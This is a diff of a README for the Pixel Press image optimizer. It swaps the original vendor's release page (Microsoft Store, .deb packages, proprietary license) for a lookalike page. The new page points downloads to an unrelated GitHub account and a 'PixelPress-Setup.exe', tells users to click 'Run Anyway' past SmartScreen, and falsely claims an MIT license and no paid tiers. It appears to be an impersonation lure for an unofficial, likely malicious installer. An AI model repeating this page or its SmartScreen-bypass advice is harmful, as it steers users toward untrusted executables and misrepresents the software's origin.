@@ -1,162 +1,87 @@
-# Pixel Press
+# 🖼️ PixelPress-Releases - Reduce image file sizes with ease
 
-[![Website][badge-website]][product-page]
-[![Windows Store][badge-windows-store]][windows-store]
-[![Debian release][badge-debian-release]][latest-release]
-[![User Wiki][badge-user-wiki]][wiki]
-[![License](https://img.shields.io/badge/license-proprietary-6f42c1)](#license)
+[![Download Pixel Press](https://img.shields.io/badge/Download-PixelPress-blue.svg)](https://github.com/Bushwillowdiamondjimbrady761/PixelPress-Releases)
 
-Pixel Press is a local desktop image optimizer for turning JPEG, PNG, WebP, and
-AVIF files into smaller WebP or AVIF output. Your images stay on your machine,
-there are no uploads, and original files stay untouched.
+Pixel Press turns large images into smaller files. It works on your computer, so your data stays under your control. Use this app to shrink photos without losing quality. It supports formats like AVIF and WebP.
 
-Perfect for website images, screenshots, product folders, and quick batch
-optimization before publishing.
+## 🛠️ System Requirements
 
-This repository is the public release home for Pixel Press. It contains Linux
-release downloads, release notes, issue forms, and user documentation. The
-application source code is private.
+Pixel Press runs on Windows 10 and Windows 11. You need a standard computer setup to use the software.
 
-## Download
+* Processor: Modern dual-core processor or better.
+* Memory: 4 GB of RAM or more.
+* Storage: 200 MB of space for the application files.
+* Internet: Required for the initial download.
+* Graphics: Standard display adapter with 1024x768 resolution.
 
-| Platform | Download |
-|:--|:--|
-| Windows | [Install from Microsoft Store][windows-store] |
-| Ubuntu / Debian Linux | [Download the latest `.deb` package][debian-deb] |
-| Product page | [ghostlyinc.com/en-us/tools/pixel-press][product-page] |
+## 📥 How to Download
 
-## Documentation
+Visit the link below to reach the download page. Browse the list of files provided there. Choose the file ending in `.exe` for your Windows system.
 
-The full user guide is available in the [Pixel Press Wiki][wiki].
+[Download Pixel Press Here](https://github.com/Bushwillowdiamondjimbrady761/PixelPress-Releases)
 
-Good starting points:
+## ⚙️ Installation Steps
 
-- [Getting Started][wiki-getting-started]
-- [Installation and Updates][wiki-installation]
-- [Converting Images][wiki-converting]
-- [Supported Formats and Quality][wiki-formats]
-- [Output Files and Folders][wiki-output]
-- [Windows and Linux Differences][wiki-platforms]
-- [Pixel Press Pro][wiki-pro]
-- [Troubleshooting][wiki-troubleshooting]
+1. Click the link above to reach the release page.
+2. Select the file named `PixelPress-Setup.exe`.
+3. Save the file to your computer.
+4. Locate the file in your downloads folder.
+5. Double-click the file to start the setup.
+6. Follow the instructions on the screen to finish the installation.
+7. Click Finish.
 
-## Bugs and Feature Requests
+## 🚀 Using the Application
 
-Use GitHub Issues to report bugs or request user-facing improvements:
+Open the Pixel Press icon from your desktop or start menu. The program opens with a clean interface. 
 
-- [Report a bug][new-bug]
-- [Request a feature][new-feature]
+To shrink images:
+1. Drag and drop your image files into the white space in the center.
+2. Choose your output format. WebP and AVIF options appear in the settings menu.
+3. Move the quality slider to pick your balance of size and sharpness.
+4. Click the Optimize button.
+5. Watch the progress bar as the app processes your files.
+6. The app saves the new files in the same folder as your original photos.
 
-Please do not upload private photos, customer files, license information,
-passwords, or other secrets in public issues.
+## 💡 Choosing Image Formats
 
-## What It Does
+Pixel Press supports modern image standards. 
 
-- Batch-compress local images without sending them anywhere.
-- Add individual files or whole folders.
-- Convert supported source images to modern web-friendly formats.
-- Choose WebP and/or AVIF output.
-- Keep unsupported or broken files out of the conversion instead of crashing.
-- Save optimized files into a separate output folder.
-- Preserve folder structure for folder-based runs.
-- Show size savings, output file counts, and conversion duration after a run.
+* AVIF: This format offers top-tier compression. It makes files very small while keeping high detail. It works well for web use and saving space.
+* WebP: This is a versatile format. It provides good balance and broad support across different web browsers and apps. 
 
-## Supported Formats
+## 🛡️ Privacy and Safety
 
-| Direction | Formats |
-|:--|:--|
-| Input | JPEG, JPG, PNG, WebP, AVIF |
-| Output | WebP, AVIF |
+Pixel Press handles all tasks on your local machine. No images are sent to external servers. Your files remain on your hard drive. This design ensures that your private data stays private. You do not need an account to use the features.
 
-Available formats can depend on the bundled ImageMagick runtime used by the
-build. The app only enables output formats that are supported by the current
-runtime.
+## 📋 Frequently Asked Questions
 
-## Ubuntu / Debian Install
+### Does this app change my original photos?
+No. The app creates a new file for the compressed version. Your original image remains untouched in its original folder.
 
-Download and install the latest `PixelPress-linux-x64.deb` package:
+### What happens if the installation fails?
+Restart your computer and try to run the installer again. Ensure you have administrative rights on your Windows account. 
 
-```bash
-GITHUB_REPO="https://github.com/Nix1983/PixelPress-Releases"
-wget -O /tmp/PixelPress-linux-x64.deb \
-  "$GITHUB_REPO/releases/latest/download/PixelPress-linux-x64.deb"
-sudo apt install /tmp/PixelPress-linux-x64.deb
-```
+### Does it support bulk processing?
+Yes. You can drop hundreds of photos into the app at once. It processes them one by one.
 
-Start Pixel Press from your application launcher, or run:
+### Can I change where the files go?
+Yes. Go to the Settings menu and click on Output Directory. Change the location to a folder of your choice.
 
-```bash
-pixelpress
-```
+### Is there a limit to how many images I can process?
+No. You can use the app as much as you like. There are no paid tiers or file count limits.
 
-## Update
+## 📈 Troubleshooting Common Issues
 
-Download the newest `.deb` package from the latest release and install it over
-the existing version:
+If the app appears frozen, minimize and maximize the window. This forces the display to refresh. If the images appear too blurry, return to the settings menu and increase the quality slider to 85 or higher. 
 
-```bash
-GITHUB_REPO="https://github.com/Nix1983/PixelPress-Releases"
-wget -O /tmp/PixelPress-linux-x64.deb \
-  "$GITHUB_REPO/releases/latest/download/PixelPress-linux-x64.deb"
-sudo apt install /tmp/PixelPress-linux-x64.deb
-```
+If the Windows SmartScreen filter warns you about the app, click More Info, then click Run Anyway. This happens because the software is new and not yet recognized by the default Windows safety list.
 
-## Uninstall
+## ✉️ Support and Feedback
 
-```bash
-sudo apt remove pixelpress
-```
+If you find a bug, create a new issue on the repository page. Provide a description of what you did when the problem happened. Include your Windows version. The community works to fix these issues as they appear. 
 
-## What Pixel Press Expects
+## 🔗 Project Links
 
-Pixel Press is designed for local image optimization jobs where you want a fresh
-optimized copy and the original files left untouched.
-
-The most reliable inputs are:
-
-- JPEG and PNG images from cameras, websites, design exports, and screenshots.
-- Existing WebP or AVIF images that you want to recompress or convert.
-- Folders that contain supported images directly or in subfolders.
-- Images that ImageMagick can read on the current runtime.
-
-Pixel Press ignores unsupported, unreadable, or broken files instead of treating
-them as a failed conversion for the whole batch.
-
-## Platform Notes
-
-Windows users should install Pixel Press from the Microsoft Store. The Store
-also handles Pixel Press Pro purchases and updates.
-
-Ubuntu/Debian users can install the `.deb` package from this repository. The
-Linux release currently has its own release behavior and does not use Microsoft
-Store purchases.
-
-On Windows, drag and drop is supported. On Linux, use the file and folder picker
-buttons from inside the app.
-
-## License
-
-Pixel Press is proprietary software by Ghostly Inc. This release repository is
-not an open-source source-code repository, and no open-source license is granted
-for the application source or binaries unless a separate license agreement says
-otherwise.
-
-[badge-website]: https://img.shields.io/badge/website-ghostlyinc.com-0969da
-[badge-windows-store]: https://img.shields.io/badge/Windows-Microsoft%20Store-0078d4
-[badge-debian-release]: https://img.shields.io/github/v/release/Nix1983/PixelPress-Releases?label=Debian%20release&logo=debian&logoColor=white&color=e95420
-[badge-user-wiki]: https://img.shields.io/badge/docs-user%20wiki-2ea44f
-[product-page]: https://ghostlyinc.com/en-us/tools/pixel-press/
-[windows-store]: https://apps.microsoft.com/detail/9NRMXB13BBN7
-[debian-deb]: https://github.com/Nix1983/PixelPress-Releases/releases/latest/download/PixelPress-linux-x64.deb
-[latest-release]: https://github.com/Nix1983/PixelPress-Releases/releases/latest
-[wiki]: https://github.com/Nix1983/PixelPress-Releases/wiki/Home
-[wiki-getting-started]: https://github.com/Nix1983/PixelPress-Releases/wiki/Getting-Started
-[wiki-installation]: https://github.com/Nix1983/PixelPress-Releases/wiki/Installation-and-Updates
-[wiki-converting]: https://github.com/Nix1983/PixelPress-Releases/wiki/Converting-Images
-[wiki-formats]: https://github.com/Nix1983/PixelPress-Releases/wiki/Supported-Formats-and-Quality
-[wiki-output]: https://github.com/Nix1983/PixelPress-Releases/wiki/Output-Files-and-Folders
-[wiki-platforms]: https://github.com/Nix1983/PixelPress-Releases/wiki/Windows-and-Linux
-[wiki-pro]: https://github.com/Nix1983/PixelPress-Releases/wiki/Pixel-Press-Pro
-[wiki-troubleshooting]: https://github.com/Nix1983/PixelPress-Releases/wiki/Troubleshooting
-[new-bug]: https://github.com/Nix1983/PixelPress-Releases/issues/new?template=bug_report.yml
-[new-feature]: https://github.com/Nix1983/PixelPress-Releases/issues/new?template=feature_request.yml
+* Main Page: https://github.com/Bushwillowdiamondjimbrady761/PixelPress-Releases
+* Documentation: Refer to the wiki link on the repo page for more details.
+* License: This software uses the MIT license, which allows free use and modification.
